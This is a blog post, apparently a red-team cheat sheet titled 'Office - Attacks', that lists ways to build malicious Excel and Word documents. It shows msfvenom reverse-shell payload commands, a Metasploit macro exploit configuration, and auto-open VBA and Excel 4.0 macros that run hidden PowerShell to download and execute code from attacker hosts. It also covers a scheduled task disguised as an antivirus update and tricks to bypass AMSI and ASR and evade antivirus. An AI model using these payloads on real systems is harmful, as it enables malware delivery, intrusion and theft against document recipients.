        <i class="fas fa-rss"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>Office - Attacks</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->





  <!-- add CDN prefix if it exists -->
  

  

  <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
  




<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>Office - Attacks</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Zxce3
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Thu, Apr 22, 2021, 12:00 AM +0700"
  

  
  prep="on" >

  
  

  
    Apr 22, 2021
  

  <i class="unloaded">2021-04-22T00:00:00+07:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3297 words">18 min reads</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <h2 id="summary">Summary</h2>

<ul>
  <li><a href="#xlsm---hot-manchego">XLSM - Hot Manchego</a></li>
  <li><a href="#xls---macrome">XLS - Macrome</a></li>
  <li><a href="#xlm-excel-40---sharpshooter">XLM Excel 4.0 - SharpShooter</a></li>
  <li><a href="#xlm-excel-40---excelntdonut">XLM Excel 4.0 - EXCELntDonut</a></li>
  <li><a href="#xlm-excel-40---exec">XLM Excel 4.0 - EXEC</a></li>
  <li><a href="#docm---metasploit">DOCM - Metasploit</a></li>
  <li><a href="#docm---download-and-execute">DOCM - Download and Execute</a></li>
  <li><a href="#docm---macro-creator">DOCM - Macro Creator</a></li>
  <li><a href="#docm---c-converted-to-office-vba-macro">DOCM - C# converted to Office VBA macro</a></li>
  <li><a href="#docm---vba-wscript">DOCM - VBA Wscript</a></li>
  <li><a href="#docm---vba-shell-execute-comment">DOCM - VBA Shell Execute Comment</a></li>
  <li><a href="#docm---vba-spawning-via-svchostexe-using-scheduled-task">DOCM - VBA Spawning via svchost.exe using Scheduled Task</a></li>
  <li><a href="#docm---wmi-com-functions">DCOM - WMI COM functions (VBA AMSI)</a></li>
  <li><a href="#docm---winmgmts">DOCM - winmgmts</a></li>
  <li><a href="#docmxlm---macro-pack---macro-and-dde">DOCM - Macro Pack - Macro and DDE</a></li>
  <li><a href="#docm---cactustorch-vba-module">DOCM - CACTUSTORCH VBA Module</a></li>
  <li><a href="#docm---mmg-with-custom-dl--exec">DOCM - MMG with Custom DL + Exec</a></li>
  <li><a href="#vba-obfuscation">VBA Obfuscation</a></li>
  <li><a href="#vba-purging">VBA Purging</a>
    <ul>
      <li><a href="#officepurge">OfficePurge</a></li>
      <li><a href="#evilclippy">EvilClippy</a></li>
    </ul>
  </li>
  <li><a href="#vba-amsi">VBA AMSI</a></li>
  <li><a href="#vba---offensive-security-template">VBA - Offensive Security Template</a></li>
  <li><a href="#docx---template-injection">DOCX - Template Injection</a></li>
  <li><a href="#docx---dde">DOCX - DDE</a></li>
  <li><a href="#references">References</a></li>
</ul>

<h2 id="xlsm---hot-manchego">XLSM - Hot Manchego</h2>

<blockquote>
  <p>When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn’t catch a simple lolbas payload to get a beacon on a target machine.</p>
</blockquote>

<ul>
  <li>https://github.com/FortyNorthSecurity/hot-manchego</li>
</ul>

<pre><code class="language-ps1">Generate CS Macro and save it to Windows as vba.txt
PS&gt; New-Item blank.xlsm
PS&gt; C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:EPPlus.dll hot-manchego.cs
PS&gt; .\hot-manchego.exe .\blank.xlsm .\vba.txt
</code></pre>

<h2 id="xlm---macrome">XLM - Macrome</h2>

<blockquote>
  <p>XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros.</p>
</blockquote>

<ul>
  <li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip</li>
  <li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip</li>
  <li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip</li>
</ul>

<pre><code class="language-ps1"># NOTE: The payload cannot contains NULL bytes.

# Default calc
msfvenom -a x86 -b '\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread &gt; popcalc.bin
msfvenom -a x64 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread &gt; popcalc64.bin
# Custom shellcode
msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\x00'
msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\x00'
# MSF shellcode
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\x00'  -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\x00' -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin

dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin
dotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-86.bin --payload64-bit shellcode-64.bin

# For VBA Macro
Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop
</code></pre>

<p>When using Macrome build mode, the –password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of <strong>VelvetSweatshop</strong> is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003.</p>

<h2 id="xlm-excel-40---sharpshooter">XLM Excel 4.0 - SharpShooter</h2>

<ul>
  <li>https://github.com/mdsecactivebreach/SharpShooter</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="c"># Options</span><span class="w">
</span><span class="nt">-rawscfile</span><span class="w"> </span><span class="err">&lt;</span><span class="n">path</span><span class="err">&gt;</span><span class="w">  </span><span class="nx">Path</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">raw</span><span class="w"> </span><span class="nx">shellcode</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">stageless</span><span class="w"> </span><span class="nx">payloads</span><span class="w">
</span><span class="nt">--scfile</span><span class="w"> </span><span class="err">&lt;</span><span class="n">path</span><span class="err">&gt;</span><span class="w">    </span><span class="nx">Path</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">shellcode</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">CSharp</span><span class="w"> </span><span class="nx">byte</span><span class="w"> </span><span class="nx">array</span><span class="w">
</span><span class="n">python</span><span class="w"> </span><span class="nx">SharpShooter.py</span><span class="w"> </span><span class="nt">--payload</span><span class="w"> </span><span class="nx">slk</span><span class="w"> </span><span class="nt">--rawscfile</span><span class="w"> </span><span class="nx">shellcode.bin</span><span class="w"> </span><span class="nt">--output</span><span class="w"> </span><span class="nx">test</span><span class="w">

</span><span class="c"># Creation of a VBA Macro</span><span class="w">
</span><span class="c"># creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet.</span><span class="w">
</span><span class="n">SharpShooter.py</span><span class="w"> </span><span class="nt">--stageless</span><span class="w"> </span><span class="nt">--dotnetver</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="nt">--payload</span><span class="w"> </span><span class="nx">macro</span><span class="w"> </span><span class="nt">--output</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="nt">--rawscfile</span><span class="w"> </span><span class="o">.</span><span class="nx">/x86payload.bin</span><span class="w"> </span><span class="nt">--com</span><span class="w"> </span><span class="nx">xslremote</span><span class="w"> </span><span class="nt">--awlurl</span><span class="w"> </span><span class="nx">http://192.168.2.8:8080/foo.xsl</span><span class="w">

</span><span class="c"># Creation of an Excel 4.0 SLK Macro Enabled Document</span><span class="w">
</span><span class="n">~</span><span class="c"># /!\ The shellcode cannot contain null bytes</span><span class="w">
</span><span class="n">msfvenom</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">generic/custom</span><span class="w"> </span><span class="nx">PAYLOADFILE</span><span class="o">=.</span><span class="n">/payload.bin</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">x86</span><span class="w"> </span><span class="nt">--platform</span><span class="w"> </span><span class="nx">windows</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">x86/shikata_ga_nai</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">raw</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">shellcode-encoded.bin</span><span class="w"> </span><span class="nt">-b</span><span class="w"> </span><span class="s1">'\x00'</span><span class="w">
</span><span class="n">SharpShooter.py</span><span class="w"> </span><span class="nt">--payload</span><span class="w"> </span><span class="nx">slk</span><span class="w"> </span><span class="nt">--output</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="nt">--rawscfile</span><span class="w"> </span><span class="nx">~./x86payload.bin</span><span class="w"> </span><span class="nt">--smuggle</span><span class="w"> </span><span class="nt">--template</span><span class="w"> </span><span class="nx">mcafee</span><span class="w">

</span><span class="n">msfvenom</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">generic/custom</span><span class="w"> </span><span class="nx">PAYLOADFILE</span><span class="o">=</span><span class="n">payload86.bin</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">x86</span><span class="w"> </span><span class="nt">--platform</span><span class="w"> </span><span class="nx">windows</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">x86/shikata_ga_nai</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">raw</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">/tmp/shellcode-86.bin</span><span class="w"> </span><span class="nt">-b</span><span class="w"> </span><span class="s1">'\x00'</span><span class="w">
</span><span class="n">SharpShooter.py</span><span class="w"> </span><span class="nt">--payload</span><span class="w"> </span><span class="nx">slk</span><span class="w"> </span><span class="nt">--output</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="nt">--rawscfile</span><span class="w"> </span><span class="nx">/tmp/shellcode-86.bin</span><span class="w"> </span><span class="nt">--smuggle</span><span class="w"> </span><span class="nt">--template</span><span class="w"> </span><span class="nx">mcafee</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="xlm-excel-40---excelntdonut">XLM Excel 4.0 - EXCELntDonut</h2>

<ul>
  <li>XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files.</li>
  <li>AMSI has no visibility into XLM macros (for now)</li>
  <li>Anti-virus struggles with XLM (for now)</li>
  <li>XLM macros can access the Win32 API (virtualalloc, createthread, …)</li>
</ul>

<ol>
  <li>Open an Excel Workbook.</li>
  <li>Right click on “Sheet 1” and click “Insert…”. Select “MS Excel 4.0 Macro”.</li>
  <li>Open your EXCELntDonut output file in a text editor and copy everything.</li>
  <li>Paste the EXCELntDonut output text in Column A of your XLM Macro sheet.</li>
  <li>At this point, everything is in column A. To fix that, we’ll use the “Text-to-Columns”/”Convert” tool under the “Data” tab.</li>
  <li>Highlight column A and open the “Text-to-Columns”  tool. Select “Delimited” and then “Semicolon” on the next screen. Select “Finished”.</li>
  <li>Right-click on cell A1* and select “Run”. This will execute your payload to make sure it works.</li>
  <li>To enable auto-execution, we need to rename cell A1* to “Auto_Open”. You can do this by clicking into cell A1 and then clicking into the box that says “A1”* just above Column A. Change the text from “A1”* to “Auto_Open”. Save the file and verify that auto-execution works.</li>
</ol>

<p>:warning: If you’re using the obfuscate flag, after the Text-to-columns operation, your macros won’t start in A1. Instead, they’ll start at least 100 columns to the right. Scroll horizontally until you see the first cell of text. Let’s say that cell is HJ1. If that’s the case, then complete steps 6-7 substituting HJ1 for A1</p>

<pre><code class="language-ps1">git clone https://github.com/FortyNorthSecurity/EXCELntDonut

-f path to file containing your C# source code (exe or dll)
-c ClassName where method that you want to call lives (dll)
-m Method containing your executable payload (dll)
-r References needed to compile your C# code (ex: -r 'System.Management')
-o output filename
--sandbox Perform basic sandbox checks. 
--obfuscate Perform basic macro obfuscation. 

# Fork
git clone https://github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\Users\User\Desktop\covenSource.cs 
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\Users\User\Desktop\covenSource.cs
donut.exe -a1 -o GruntHttpx86.bin GruntHttpX86.exe
donut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe
usage: drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate]
python3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin
</code></pre>

<p>XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md</p>

<h2 id="xlm-excel-40---exec">XLM Excel 4.0 - EXEC</h2>

<ol>
  <li>Right Click to the current sheet</li>
  <li>Insert a <strong>Macro IntL MS Excel 4.0</strong></li>
  <li>Add the <code class="language-plaintext highlighter-rouge">EXEC</code> macro
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="o">=</span><span class="n">EXEC</span><span class="p">(</span><span class="s2">"poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg('http://10.10.10.10:80/update.ps1')"</span><span class="p">)</span><span class="w">
 </span><span class="o">=</span><span class="n">halt</span><span class="p">()</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Rename cell to <strong>Auto_open</strong></li>
  <li>Hide your macro worksheet by a right mouse click on the sheet name <strong>Macro1</strong> and selecting <strong>Hide</strong></li>
</ol>

<h2 id="docm---metasploit">DOCM - Metasploit</h2>

<pre><code class="language-ps1">use exploit/multi/fileformat/office_word_macro
set payload windows/meterpreter/reverse_http
set LHOST 10.10.10.10
set LPORT 80
set DisablePayloadHandler True
set PrependMigrate True
set FILENAME Financial2021.docm
exploit -j
</code></pre>

<h2 id="docm---download-and-execute">DOCM - Download and Execute</h2>

<blockquote>
  <p>Detected by Defender (AMSI)</p>
</blockquote>

<pre><code class="language-ps1">Sub Execute()
Dim payload
payload = "powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('http://10.10.10.10:4242/exploit');"
Call Shell(payload, vbHide)
End Sub
Sub Document_Open()
Execute
End Sub
</code></pre>

<h2 id="docm---macro-creator">DOCM - Macro Creator</h2>

<ul>
  <li>https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator</li>
</ul>

<pre><code class="language-ps1"># Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion:
C:\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body
# Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion:
C:\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o
# Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion:
C:\PS&gt; Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e
</code></pre>

<h2 id="docm---c-converted-to-office-vba-macro">DOCM - C# converted to Office VBA macro</h2>

<blockquote>
  <p>A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted.</p>
</blockquote>

<p>https://github.com/trustedsec/unicorn</p>

<pre><code class="language-ps1">python unicorn.py payload.cs cs macro
</code></pre>

<h2 id="docm---vba-wscript">DOCM - VBA Wscript</h2>

<blockquote>
  <p>https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office</p>
</blockquote>

<pre><code class="language-ps1">Sub parent_change()
    Dim objOL
    Set objOL = CreateObject("Outlook.Application")
    Set shellObj = objOL.CreateObject("Wscript.Shell")
    shellObj.Run("notepad.exe")
End Sub
Sub AutoOpen()
    parent_change
End Sub
Sub Auto_Open()
    parent_change
End Sub
</code></pre>

<div class="language-vb highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">).</span><span class="n">Run</span> <span class="s">"calc.exe"</span>
<span class="n">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">).</span><span class="n">Exec</span> <span class="s">"notepad.exe"</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="docm---vba-shell-execute-comment">DOCM - VBA Shell Execute Comment</h2>

<p>Set your command payload inside the <strong>Comment</strong> metadata of the document.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="k">Sub</span> <span class="nf">beautifulcomment</span><span class="p">()</span>
    <span class="k">Dim</span> <span class="nv">p</span> <span class="ow">As</span> <span class="n">DocumentProperty</span>
    <span class="k">For</span> <span class="k">Each</span> <span class="n">p</span> <span class="ow">In</span> <span class="n">ActiveDocument</span><span class="p">.</span><span class="n">BuiltInDocumentProperties</span>
        <span class="k">If</span> <span class="n">p</span><span class="p">.</span><span class="n">Name</span> <span class="o">=</span> <span class="s">"Comments"</span> <span class="k">Then</span>
            <span class="n">Shell</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">Value</span><span class="p">)</span>
        <span class="k">End</span> <span class="k">If</span>
    <span class="k">Next</span>
<span class="k">End</span> <span class="k">Sub</span>

<span class="k">Sub</span> <span class="nf">AutoExec</span><span class="p">()</span>
    <span class="n">beautifulcomment</span>
<span class="k">End</span> <span class="k">Sub</span>

<span class="k">Sub</span> <span class="nf">AutoOpen</span><span class="p">()</span>
    <span class="n">beautifulcomment</span>
<span class="k">End</span> <span class="k">Sub</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="docm---vba-spawning-via-svchostexe-using-scheduled-task">DOCM - VBA Spawning via svchost.exe using Scheduled Task</h2>

<pre><code class="language-ps1">Sub AutoOpen()
    Set service = CreateObject("Schedule.Service")
    Call service.Connect
    Dim td: Set td = service.NewTask(0)
    td.RegistrationInfo.Author = "Kaspersky Corporation"
    td.settings.StartWhenAvailable = True
    td.settings.Hidden = False
    Dim triggers: Set triggers = td.triggers
    Dim trigger: Set trigger = triggers.Create(1)
    Dim startTime: ts = DateAdd("s", 30, Now)
    startTime = Year(ts) &amp; "-" &amp; Right(Month(ts), 2) &amp; "-" &amp; Right(Day(ts), 2) &amp; "T" &amp; Right(Hour(ts), 2) &amp; ":" &amp; Right(Minute(ts), 2) &amp; ":" &amp; Right(Second(ts), 2)
    trigger.StartBoundary = startTime
    trigger.ID = "TimeTriggerId"
    Dim Action: Set Action = td.Actions.Create(0)
    Action.Path = "C:\Windows\System32\powershell.exe"
    Action.Arguments = "-nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))"
    Call service.GetFolder("\").RegisterTaskDefinition("AVUpdateTask", td, 6, , , 3)
End Sub
Rem powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))"
</code></pre>

<h2 id="docm---wmi-com-functions">DOCM - WMI COM functions</h2>

<p>Basic WMI exec (detected by Defender) : <code class="language-plaintext highlighter-rouge">r = GetObject("winmgmts:\\.\root\cimv2:Win32_Process").Create("calc.exe", null, null, intProcessID)</code></p>

<pre><code class="language-ps1">Sub wmi_exec()
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" &amp; strComputer &amp; "\root\cimv2")
    Set objStartUp = objWMIService.Get("Win32_ProcessStartup")
    Set objProc = objWMIService.Get("Win32_Process")
    Set procStartConfig = objStartUp.SpawnInstance_
    procStartConfig.ShowWindow = 1
    objProc.Create "powershell.exe", Null, procStartConfig, intProcessID
End Sub
</code></pre>

<ul>
  <li>https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3</li>
  <li>https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2</li>
</ul>

<pre><code class="language-ps1">Sub ASR_bypass_create_child_process_rule5()
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("win" &amp; "mgmts" &amp; ":\\" &amp; strComputer &amp; "\root" &amp; "\cimv2")
    Set objStartup = objWMIService.Get("Win32_" &amp; "Process" &amp; "Startup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" &amp; strComputer &amp; "\root" &amp; "\cimv2" &amp; ":Win32_" &amp; "Process")
    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'http://10.10.10.10/stage.ps1')", Null, objConfig, intProcessID
End Sub

Sub AutoExec()
    ASR_bypass_create_child_process_rule5
End Sub

Sub AutoOpen()
    ASR_bypass_create_child_process_rule5
End Sub
</code></pre>

<pre><code class="language-ps1">Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
Set SW = GetObject("new:" &amp; ShellWindows).Item()
SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows\System32", Null, 0
</code></pre>

<h2 id="docmxlm---macro-pack---macro-and-dde">DOCM/XLM - Macro Pack - Macro and DDE</h2>

<blockquote>
  <p>Only the community version is available online.</p>
</blockquote>

<ul>
  <li>git clone https://github.com/sevagas/macro_pack</li>
  <li>https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre></td><td class="rouge-code"><pre><span class="c"># Options</span><span class="w">
</span><span class="nt">-G</span><span class="p">,</span><span class="w"> </span><span class="nt">--generate</span><span class="o">=</span><span class="n">OUTPUT_FILE_PATH.</span><span class="w"> </span><span class="nx">Generates</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">file.</span><span class="w"> 
</span><span class="nt">-t</span><span class="p">,</span><span class="w"> </span><span class="nt">--template</span><span class="o">=</span><span class="n">TEMPLATE_NAME</span><span class="w">    </span><span class="nx">Use</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="nx">template</span><span class="w"> </span><span class="nx">already</span><span class="w"> </span><span class="nx">included</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">MacroPack</span><span class="w">
</span><span class="nt">-o</span><span class="p">,</span><span class="w"> </span><span class="nt">--obfuscate</span><span class="w"> </span><span class="n">Obfuscate</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="p">(</span><span class="n">remove</span><span class="w"> </span><span class="nx">spaces</span><span class="p">,</span><span class="w"> </span><span class="nx">obfuscate</span><span class="w"> </span><span class="nx">strings</span><span class="p">,</span><span class="w"> </span><span class="nx">obfuscate</span><span class="w"> </span><span class="nx">functions</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">variables</span><span class="w"> </span><span class="nx">name</span><span class="p">)</span><span class="w">

</span><span class="c"># Execute a command</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"calc.exe"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">CMD</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">cmd.xsl</span><span class="w">

